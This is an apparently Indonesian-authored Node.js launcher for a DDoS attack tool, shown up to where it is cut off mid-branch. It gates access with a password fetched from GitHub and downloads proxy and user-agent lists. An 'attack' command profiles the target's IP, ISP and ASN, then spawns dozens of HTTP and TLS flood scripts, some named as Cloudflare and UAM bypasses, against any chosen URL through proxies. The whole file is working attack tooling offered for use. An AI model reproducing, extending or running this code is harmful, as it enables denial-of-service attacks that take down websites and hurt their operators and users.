const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.0.0'
let processList = [];
const Port = '443'
const Concurrents = '1/1'
const owner = 'Fal' 
const cyan = '\x1b[96m'
const bold = '\x1b[1m';
const back_putih = '\x1b[48;5;255m';
const teksmerah = '\x1b[31m';
const Reset = '\x1b[0m';
const biru = '\x1b[36m'
const hijau = '\x1b[38;2;144;238;144m'
const { parsePhoneNumberFromString, getCountryCallingCode } = require('libphonenumber-js');
const carrier = require('libphonenumber-js/metadata.min.json');  // Pustaka metadata untuk detail negara
const geocoder = require('libphonenumber-js/metadata.min.json'); // Pustaka metadata untuk detail geografi

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⠶⢦⣄⠀⠀⠀.          ⠀⠀⠀  \u001b[0m     \u001b[1m\u001b[36mWelcome to DdoS Script\u001b[0m
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠁⠀⠸⠛⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\u001b[0m          \u001b[36mFull Power DDoS Tools\u001b[0m
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀⣿⠹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\u001b[0m     \u001b[0m_____________________________________________\u001b[0m
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⣿⠀⢿⠀⣴⠟⠷⣆⠀⠀⠀⠀⠀⠀⠀\u001b[0m     \u001b[32m${bold}${biru}Telegram:@yapalaga\u001b[0m
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠃⠀⠀⠀⠀⢀⣤⡟⠀⢸⣿⠃⠀⠀⠘⣷⠀⠀⠀⠀⠀⠀\u001b[0m     \u001b[32m${bold}${biru}Version: ${version}\u001b[0m
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⣸⡿⠿⠟⢿⡏⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀\u001b[0m     \u001b[32m${bold}${biru}VIP: Yes \u001b[0m
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⣼⡇⠀⠀⠀⣸⡏⠀⠀⠀⠀⠀⠀\u001b[0m     \u001b[32m${bold}${biru}Max time: 1000 \u001b[0m
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠛⡋⠉⣩⡇⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⣰⠟⠋⠁⠀⠀⢠⡟⠀⠀⠀⠀⠀⠀⠀\u001b[0m     \u001b[32mExpired:${bold}${merah} ∞${bold}${biru}\u001b[0m
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏⢠⡞⣱⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠟⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⠀⠀\u001b[0m     \u001b[33mOnline Date: ${bold}${biru}${formattedDate}${Reset}\u001b[0m
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠃⢀⣿⢁⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⣠⢰⣿⠀⠀⠀⠀⠀⠀⠀⠀
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠁⠀⢸⣿⣿⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⢀⣶⣾⡇⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠀⠀⠀⢸⣿⣿⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣏⣠⢰⢻⡟⢃⡿⡟⣿⠀⠀⠀⠀⠀⠀⠀⠀
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡇⠀⠀⠀⠀⠁⢿⠹⣿⣄⠀⠀⠀⢀⠀⠀⠀⠀⢺⠏⣿⣿⠼⠁⠈⠰⠃⣿⠀⠀⠀⠀⠀⠀⠀⠀
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡟⠃⠀⠈⢻⣷⣄⠈⠁⣿⣿⡇⠀⠀⠈⣧⠀⠀⠀⠘⣠⠟⠁⠀⠀⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⠀
\u001b[31m⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠀⠀⣴⠀⠀⣿⡿⠀⠸⠋⢸⣿⣧⡐⣦⣸⡆⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀
\u001b[31m⠀⠀⠀⠀⠀⠀⣠⡿⠃⠀⣀⣴⣿⡆⢀⣿⠃⠀⠀⠀⣸⠟⢹⣷⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣧⠀⠀⠀⠀⠀⠀
\u001b[31m⠀⠀⠀⣀⣤⣾⡏⠛⠻⠿⣿⣿⣿⠁⣼⠇⠀⠀⠀⠀⠁⠀⢸⣿⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣇⠀⠀⠀⠀⠀
\u001b[31m⠲⢾⣿⣿⣿⣿⣇⢀⣠⣴⣿⡿⢁⣼⣿⣀⠀⠀⠀⠀⠀⠀⠈⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣆⠀⠀⠀⠀
\u001b[36m⠀⠀⠉⠙⠛⠻⣿⣷⣶⣿⣷⠾⣿⣵⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⢤⡀⠀⠀⠀⠀⠀⠀⠀⡀⢿⡆⠀⠀⠀
\u001b[36m⠀⠀⠀⠀⠀⣰⣿⡟⣴⠀⠀⠉⠉⠁⢿⡇⣴⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡆⠀⠀⠀⠀⣴⠀⣿⣿⣿⠀⠀⠀
\u001b[36m⠀⠀⠀⠀⢠⣿⠿⣿⣿⢠⠇⠀⠀⠀⢸⣿⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣀⠀⠀⢸⣿⡄⠀⠀⣼⣿⣇⢹⡟⢿⡇⠀⠀
\u001b[36m⠀⠀⠀⠀⣿⠃⣠⣿⣿⣿⠀⠀⠀⠀⠀⢻⡈⢿⣆⠀⢳⡀⠀⢠⠀⠀⠀⠀⠀⢸⣿⣦⠀⣸⠿⣷⡀⠀⣿⣿⢿⣾⣿⠸⠇⠀⠀
\u001b[36m⠀⠀⠀⠀⠋⣰⣿⣿⣿⣿⡀⢰⡀⠀⠀⠀⠀⠈⢻⣆⣼⣷⣄⠈⢷⡀⠀⠀⠀⢸⣿⢿⣶⠟⠀⠙⣷⣼⣿⣿⡄⠻⣿⣧⡀⠀⠀
\u001b[36m⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣧⡿⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠻⣷⣼⣿⣦⡀⠀⣼⠇⠸⠋⠀⠀⠀⠈⠻⣿⣿⣷⡀⠈⠻⣷⡀⠀
\u001b[36m⠀⠀⠀⠀⠀⣿⣼⡿⢻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠈⠻⣷⡙⣿⣶⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣷⢠⣀⠘⣷⡀
\u001b[36m⠀⠀⠀⠀⠀⠀⣿⠇⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠈⠛⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⢻⣷⣾⡇
\u001b[36m⠀⠀⠀⠀⠀⠀⣿⢠⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⢈⣿⡹⣷
\u001b[36m⠀⠀⠀⠀⠀⠀⠈⠀⠻⠿⠿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
       ⠀⠀⠀⣸⣿⡇⠉
\u001b[0m
WELCOME DI SC TOOLS DDOS FAL
Type ${bold}${hijau}"methods"${Reset} For Showing All Server Menu
========================================================================`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/dalyudiyudi12345/kamunanya/master/proxybaldev.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/dalyudiyudi12345/kamunanya/master/ua1.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/dalyudiyudi12345/kamunanya/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/MeowzS/Pw/refs/heads/main/pas.txt');
    const password = await secretBangetJir.text();
    await console.log(`LOGIN MASUKAN PASSWORD`)
    permen.question('[\x1b[1m\x1b[31mFalSecurity\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Login`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`Welcome To Fal Tools ${version}`)
        await sleep(1000)
		    await banner()
        console.log(`Type "Menu" For Showing All Available Command`)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g flayingstress-tools`)
      console.log(`Installing update`)
      await exec(`npm i -g flayingstress-tools`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //
async function AttackBotnetEndpoints(args) {
  if (args.length < 3) {
    console.log(`Example: attack <target> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
\x1b[37m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \x1b[37m╔═╗╔═╗╔╗╔╔╦╗
\x1b[37m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\x1b[37m ╚═╗║╣ ║║║ ║
\x1b[37m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\x1b[37m ╚═╝╚═╝╝╚╝ ╩
\x1b[37m                            ATTACK HAS BEEN STARTED!
\x1b[35m                ╚╦════════════════════════════════════════════╦╝
           ╔═════╩════════════════════════════════════════════╩═════╗
                 \x1b[48;5;15m \x1b[1;96mAttack\x1b[0m •  \x1b[48;5;15m \x1b[1;96mDetails\x1b[1;40m \x1b[0m \x1b[1;37m \x1b[0m\n
\x1b[37m                STATUS   : \x1b[37;91m[ \x1b[94;32mATTACK SENT SUCCESSFULLY\x1b[37;91m]
\x1b[37m                TARGET   : \x1b[37;91m[ \x1b[94;36m${target} \x1b[37;91m]
\x1b[37m                TIME     : \x1b[37;91m[ \x1b[94;36m${duration} \x1b[37;91m]
\x1b[37m                METHODS  : \x1b[91m[ \x1b[94;36m${methods} \x1b[37;91m]
\x1b[37m           START ATTACK  : \x1b[37;91m[ \x1b[94;36m${current_date} \x1b[37;91m]
\x1b[37m                   OWNER : \x1b[37;91m[ \x1b[94;36m@yapa \x1b[37;91m]
         ╚════════════════════════════════════════════════════════╝
         ╔════════════════════════════════════════════════════════╗
                 \x1b[48;5;15m \x1b[1;96mTarget\x1b[0m •  \x1b[48;5;15m \x1b[1;96mDetail\x1b[1;40m \x1b[0m \x1b[1;37m \x1b[0m\n
\x1b[37m                ASN      : \x1b[37;91m[ \x1b[94;36m${result.as} \x1b[37;91m]
\x1b[37m                IP       : \x1b[37;91m[ \x1b[94;36m${result.query} \x1b[37;91m]
\x1b[37m                ISP      : \x1b[37;91m[ \x1b[94;36m${result.isp} \x1b[37;91m]
\x1b[37m           continent     : \x1b[37;91m[ \x1b[94;36m${result.continent} \x1b[37;91m]
\x1b[37m             country     : \x1b[37;91m[ \x1b[94;36m${result.country} \x1b[37;91m]
\x1b[35m           ╚════════════════════════════════════════════════════════╝

`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`)
          sigma()
	} else if (methods === 'api') {
       pushOngoing(target, methods, duration)
const kikaz = path.join(__dirname, `/lib/cache/kikaz.js`);
const bypass = path.join(__dirname, `/lib/cache/bypass.js`);
const tls = path.join(__dirname, `/lib/cache/tls.js`);
const vxn = path.join(__dirname, `/lib/cache/vxn.js`);
const xin = path.join(__dirname, `/lib/cache/xin.js`);
const cookie = path.join(__dirname, `/lib/cache/cookie.js`);
const maklo = path.join(__dirname, `/lib/cache/maklo.js`);
const mixmax = path.join(__dirname, `/lib/cache/mixmax.js`);
const clasik = path.join(__dirname, `/lib/cache/clasik.js`);
const cipca = path.join(__dirname, `/lib/cache/cipca.js`);
const rapid = path.join(__dirname, `/lib/cache/rapid.js`);
const hyper = path.join(__dirname, `/lib/cache/hyper.js`);
const bomba = path.join(__dirname, `/lib/cache/bomba.js`);
const https = path.join(__dirname, `/lib/cache/https.js`);
const brow = path.join(__dirname, `/lib/cache/brow.js`);
const pluto = path.join(__dirname, `/lib/cache/pluto.js`);
const java = path.join(__dirname, `/lib/cache/java.js`);
const zx = path.join(__dirname, `/lib/cache/zx.js`);
const cars = path.join(__dirname, `/lib/cache/cars.js`);
const floodv2 = path.join(__dirname, `/lib/cache/floodv2.js`);
const BYPASSSATURN = path.join(__dirname, `/lib/cache/BYPASSSATURN.js`);
const CLOUDFLARE = path.join(__dirname, `/lib/cache/CLOUDFLARE.js`);
const nightc2 = path.join(__dirname, `/lib/cache/nightc2.js`);
const xhttp = path.join(__dirname, `/lib/cache/xhttp.js`);
const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
const storm = path.join(__dirname, `/lib/cache/storm.js`);
const rape = path.join(__dirname, `/lib/cache/rape.js`);
const hand = path.join(__dirname, `/lib/cache/hand.js`);
const starstls = path.join(__dirname, `/lib/cache/starstls.js`);
const UAM = path.join(__dirname, `/lib/cache/UAM.js`);
const uambypass = path.join(__dirname, `/lib/cache/uambypass.js`);
        exec(`node ${destroy} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${rape} ${duration} 10 proxy.txt 100 ${target}`)
        exec(`node ${kikaz} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${bypass} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${tls} ${target} 10 100 ${duration}`)
        exec(`node ${clasik} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${vxn} ${target} ${duration}`)
        exec(`node ${xin} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${cookie} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${maklo} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${mixmax} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${cipca} ${target} ${duration} 10 proxy.txt 100 captha`) 
        exec(`node ${rapid} GET ${duration} 10 proxy.txt 100 ${target}`) 
        exec(`node ${hyper} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${bomba} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${https} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${brow} ${target} ${duration} 10 100 proxy.txt`) 
        exec(`node ${pluto} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${java} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${zx} ${target} ${duration} 10 proxy.txt 100`)
        exec(`node ${cars} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${floodv2} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${BYPASSSATURN} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${CLOUDFLARE} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${nightc2} ${target} ${duration} 100 10 proxy.txt flood`)
        exec(`node ${xhttp} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${hand} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${starstls} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${UAM} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${uambypass} ${target} ${duration} 100 proxy.txt`)
          sigma()
          } else if (methods === 'mix') {
       pushOngoing(target, methods, duration)
const ciko = path.join(__dirname, `/lib/cache/ciko.js`);
const flood = path.join(__dirname, `/lib/cache/flood.js`);
const cyn = path.join(__dirname, `/lib/cache/cyn.js`);
const uambypass = path.join(__dirname, `/lib/cache/uambypass.js`);
const tlskill = path.join(__dirname, `/lib/cache/tlskill.js`);
const vss = path.join(__dirname, `/lib/cache/vss.js`);
const vssn = path.join(__dirname, `/lib/cache/vssn.js`);
const vssny = path.join(__dirname, `/lib/cache/vssny.js`);
const skynet = path.join(__dirname, `/lib/cache/skynet.js`);
const thunder = path.join(__dirname, `/lib/cache/thunder.js`);
const vxx = path.join(__dirname, `/lib/cache/vxx.js`);
const Medusa = path.join(__dirname, `/lib/cache/Medusa.js`);
const dbotnet = path.join(__dirname, `/lib/cache/dbotnet.js`);
const ASTRAL = path.join(__dirname, `/lib/cache/ASTRAL.js`);
        exec(`node ${ciko} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${flood} ${target} ${duration}`)
        exec(`node ${cyn} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${uambypass} ${target} ${duration} 100 proxy.txt`)
        exec(`node ${tlskill} ${target} ${duration} 100 10`)
        exec(`node ${vss} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${vssn} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${vssny} ${target} ${duration} 100 10 proxy.txt FLOOD`)
        exec(`node ${skynet} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${vxx} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${thunder} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${Medusa} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${dbotnet} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${ASTRAL} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'tls') {
       pushOngoing(target, methods, duration)
       const strike = path.join(__dirname, `/lib/cache/strike.js`);
const flayingraw = path.join(__dirname, `/lib/cache/flayingraw.js`);
const hyper = path.join(__dirname, `/lib/cache/hyper.js`);
const bomba = path.join(__dirname, `/lib/cache/bomba.js`);
const https = path.join(__dirname, `/lib/cache/https.js`);
const vxn = path.join(__dirname, `/lib/cache/vxn.js`);
const xin = path.join(__dirname, `/lib/cache/xin.js`);
const cookie = path.join(__dirname, `/lib/cache/cookie.js`);
const maklo = path.join(__dirname, `/lib/cache/maklo.js`);
const mixmax = path.join(__dirname, `/lib/cache/mixmax.js`);
const clasik = path.join(__dirname, `/lib/cache/clasik.js`);
const cipca = path.join(__dirname, `/lib/cache/cipca.js`);
const rapid = path.join(__dirname, `/lib/cache/rapid.js`);
const brow = path.join(__dirname, `/lib/cache/brow.js`);
const pluto = path.join(__dirname, `/lib/cache/pluto.js`);
const java = path.join(__dirname, `/lib/cache/java.js`);
const zx = path.join(__dirname, `/lib/cache/zx.js`);
const cars = path.join(__dirname, `/lib/cache/cars.js`);
const floodv2 = path.join(__dirname, `/lib/cache/floodv2.js`);
const BYPASSSATURN = path.join(__dirname, `/lib/cache/BYPASSSATURN.js`);
const CLOUDFLARE = path.join(__dirname, `/lib/cache/CLOUDFLARE.js`);
const nightc2 = path.join(__dirname, `/lib/cache/nightc2.js`);
const xhttp = path.join(__dirname, `/lib/cache/xhttp.js`);
const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
const storm = path.join(__dirname, `/lib/cache/storm.js`);
const rape = path.join(__dirname, `/lib/cache/rape.js`);
const hand = path.join(__dirname, `/lib/cache/hand.js`);
const starstls = path.join(__dirname, `/lib/cache/starstls.js`);
const UAM = path.join(__dirname, `/lib/cache/UAM.js`);
        exec(`node ${strike} GET ${target} ${duration} 10 100 proxy.txt --full`)
        exec(`node ${flayingraw} ${target} ${duration}`)
        exec(`node ${hyper} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${bomba} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${https} ${target} ${duration} 100 10 proxy.txt`) 
         exec(`node ${vxn} ${target} ${duration}`)
        exec(`node ${xin} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${cookie} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${maklo} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${mixmax} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${rapid} GET ${duration} 10 proxy.txt 100 ${target}`) 
        exec(`node ${brow} ${target} ${duration} 10 100 proxy.txt`) 
        exec(`node ${pluto} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${java} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${zx} ${target} ${duration} 10 proxy.txt 100`)
        exec(`node ${cars} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${floodv2} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${BYPASSSATURN} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${CLOUDFLARE} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${nightc2} ${target} ${duration} 100 10 proxy.txt flood`)
        exec(`node ${xhttp} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${hand} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${starstls} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${UAM} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'sigma') {
       pushOngoing(target, methods, duration)
       const tls = path.join(__dirname, `/lib/cache/tls.js`);
       const maklo = path.join(__dirname, `/lib/cache/maklo.js`);
       const cyn = path.join(__dirname, `/lib/cache/cyn.js`);
       const ciko = path.join(__dirname, `/lib/cache/ciko.js`);
       const kikaz = path.join(__dirname, `/lib/cache/kikaz.js`);
       const mixmax = path.join(__dirname, `/lib/cache/mixmax.js`);
       exec(`node ${tls} ${target} 50 443 ${duration}`)
       exec(`node ${maklo} ${target} ${duration} 443 50 proxy.txt`) 
       exec(`node ${cyn} ${target} ${duration} 443 50 proxy.txt`)
       exec(`node ${ciko} ${target} ${duration} 443 50 proxy.txt`)
       exec(`node ${kikaz} ${target} ${duration} 443 50 proxy.txt`)
       exec(`node ${mixmax} ${target} ${duration} 443 50 proxy.txt`)
          sigma() 
          } else if (methods === 'fal') {
       pushOngoing(target, methods, duration)
const cibi = path.join(__dirname, `/lib/cache/cibi.js`);
const httpx = path.join(__dirname, `/lib/cache/httpx.js`);
const pidoras = path.join(__dirname, `/lib/cache/pidoras.js`);
const rapid = path.join(__dirname, `/lib/cache/rapid.js`);
       exec(`node ${cibi} ${target} ${duration} 40 10 proxy.txt`)
       exec(`node ${httpx} ${target} ${duration} 30 10 proxy.txt`)
       exec(`node ${pidoras} ${target} ${duration} 40 10 proxy.txt`)
       exec(`node ${rapid} ${target} ${duration} 40 10 proxy.txt`)
       } else if (methods === 'glory') {
       	pushOngoing(target, methods, duration)
const glory = path.join(__dirname, `/lib/cache/glory.js`);
const quantum = path.join(__dirname, `/lib/cache/quantum.js`);
        exec(`node ${glory} ${target} ${duration} 40 10 proxy.txt`)
        exec(`node ${quantum} ${target} ${duration} 40 10 proxy.txt`)
          } else if (methods === 'http') {
       pushOngoing(target, methods, duration)
const kikaz = path.join(__dirname, `/lib/cache/kikaz.js`);
const bypass = path.join(__dirname, `/lib/cache/bypass.js`);
const tls = path.join(__dirname, `/lib/cache/tls.js`);
const vxn = path.join(__dirname, `/lib/cache/vxn.js`);
const xin = path.join(__dirname, `/lib/cache/xin.js`);
const cookie = path.join(__dirname, `/lib/cache/cookie.js`);
const maklo = path.join(__dirname, `/lib/cache/maklo.js`);
const mixmax = path.join(__dirname, `/lib/cache/mixmax.js`);
const java = path.join(__dirname, `/lib/cache/java.js`);
const zx = path.join(__dirname, `/lib/cache/zx.js`);
const cars = path.join(__dirname, `/lib/cache/cars.js`);
const floodv2 = path.join(__dirname, `/lib/cache/floodv2.js`);
const BYPASSSATURN = path.join(__dirname, `/lib/cache/BYPASSSATURN.js`);
const CLOUDFLARE = path.join(__dirname, `/lib/cache/CLOUDFLARE.js`);
const nightc2 = path.join(__dirname, `/lib/cache/nightc2.js`);
const xhttp = path.join(__dirname, `/lib/cache/xhttp.js`);
const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
const storm = path.join(__dirname, `/lib/cache/storm.js`);
const rape = path.join(__dirname, `/lib/cache/rape.js`);
const hand = path.join(__dirname, `/lib/cache/hand.js`);
const starstls = path.join(__dirname, `/lib/cache/starstls.js`);
const UAM = path.join(__dirname, `/lib/cache/UAM.js`);
const uambypass = path.join(__dirname, `/lib/cache/uambypass.js`);
const tlskill = path.join(__dirname, `/lib/cache/tlskill.js`);
const vss = path.join(__dirname, `/lib/cache/vss.js`);
const vssn = path.join(__dirname, `/lib/cache/vssn.js`);
const vssny = path.join(__dirname, `/lib/cache/vssny.js`);
const skynet = path.join(__dirname, `/lib/cache/skynet.js`);
const thunder = path.join(__dirname, `/lib/cache/thunder.js`);
const vxx = path.join(__dirname, `/lib/cache/vxx.js`);
const Medusa = path.join(__dirname, `/lib/cache/Medusa.js`);
const dbotnet = path.join(__dirname, `/lib/cache/dbotnet.js`);
const ASTRAL = path.join(__dirname, `/lib/cache/ASTRAL.js`);
        exec(`node ${kikaz} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${bypass} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${tls} ${target} 10 100 ${duration}`)
        exec(`node ${vxn} ${target} ${duration}`)
        exec(`node ${xin} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${cookie} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${maklo} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${mixmax} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${java} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${zx} ${target} ${duration} 10 proxy.txt 100`)
        exec(`node ${cars} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${floodv2} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${BYPASSSATURN} ${target} ${duration} 100 10 proxy.txt`)
